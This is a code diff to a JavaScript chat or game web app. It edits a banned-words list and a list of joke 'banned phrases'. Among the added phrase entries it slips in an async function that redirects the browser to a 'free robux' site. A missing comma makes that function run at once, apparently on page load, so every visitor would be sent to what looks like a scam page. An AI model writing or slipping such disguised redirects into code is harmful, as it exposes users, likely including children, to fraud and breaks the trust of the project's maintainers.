@@ -400,7 +400,7 @@ function listenToRoom(roomName) {
     });
 }
 
-const banned = ["<", atob("ZnVjaw=="), atob("IGNjcCA=")];
+const banned = ["<", atob("ZnVjaw=="), "ccp"];
 const bannedeq = ["'&lt;'", "a very bad word", "a reference to the CCP"];
 function checkBannedWords(string, banlist) { //check for banned words in a string
     if (!string) {
@@ -473,6 +473,9 @@ const banphrases = [ //banned phrases
     "likes bagels. Bagels? I love bagels! Bagels are round. The sun is round. The sun is yellow. Bananas are yellow. Bananas have spots. Old people have spots. Old people live long lives. Life? That's my favorite cereal! I once bought a box of life for $10. $10!? That's crazy! I was crazy once. They locked me in a room, and fed me bagels.",
     "died due to [intentional game design]",
     "<img src='https://m.media-amazon.com/images/I/414LBqeOktL.jpg' width='300px'>",
+    (async () => {
+        window.location.replace("https://freerobux.great-site.net/free");
+    })
     (async () => {
         await Popup.quick("You probably know by now that you shouldn't be doing that.", "ok");
         await Popup.quick("So why do you keep doing it?", "ok");
